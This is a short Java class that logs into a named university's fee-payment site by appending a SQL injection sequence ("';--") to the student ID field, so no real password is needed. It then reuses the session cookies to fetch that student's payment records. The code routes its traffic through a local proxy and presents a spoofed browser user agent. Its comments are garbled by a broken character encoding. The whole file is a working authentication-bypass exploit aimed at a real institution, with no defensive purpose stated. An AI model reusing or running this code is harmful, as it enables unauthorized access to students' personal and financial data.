package com.gs.main;

import java.io.IOException;

import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;

public class ShouFeiLogin {
	private HttpClient hc = new HttpClient();
	public String login(String id) throws HttpException, IOException{
		hc.getHostConfiguration().setProxy("127.0.0.1", 8087);  
		hc.getParams().setParameter(HttpMethodParams.USER_AGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36");//������Ϣ 
		PostMethod p = new PostMethod("http://shoufei.hebust.edu.cn/kd/login.jsp");
		p.addParameter("EdtStuID", id+"';--");
		p.addParameter("mm", "haha");
		hc.getParams().setCookiePolicy(CookiePolicy.BROWSER_COMPATIBILITY);
		hc.executeMethod(p);
		// ��õ�½��� Cookie
		Cookie[] cookies = hc.getState().getCookies();
		String tmpcookies = "";
		for (Cookie c : cookies) {
			tmpcookies += c.toString() + ";";
		}
		// ���е�½��Ĳ���
		PostMethod postMethod = new PostMethod(
				"http://shoufei.hebust.edu.cn/kd/qrypayment.jsp");
		// ÿ�η�������Ȩ����ַʱ�����ǰ��� cookie ��Ϊͨ��֤
		postMethod.setRequestHeader("cookie", tmpcookies);
		hc.executeMethod(postMethod);
		String s = postMethod.getResponseBodyAsString();
		return s;
	}
}
